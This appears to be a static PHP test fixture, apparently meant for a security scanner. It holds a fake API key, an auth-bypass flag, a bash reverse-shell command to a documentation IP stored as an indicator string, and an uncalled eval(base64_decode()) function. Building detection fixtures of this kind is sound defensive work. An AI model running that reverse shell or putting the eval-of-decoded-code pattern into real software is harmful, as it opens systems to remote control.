<?php // STATIC FIXTURE ONLY. Never execute; tokens are invented.
$api_key = "LGFixtureKey9Z7Q2";
$auth_bypass = true;
$indicator = "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1";
function never_called() { return eval(base64_decode("MQ==")); }
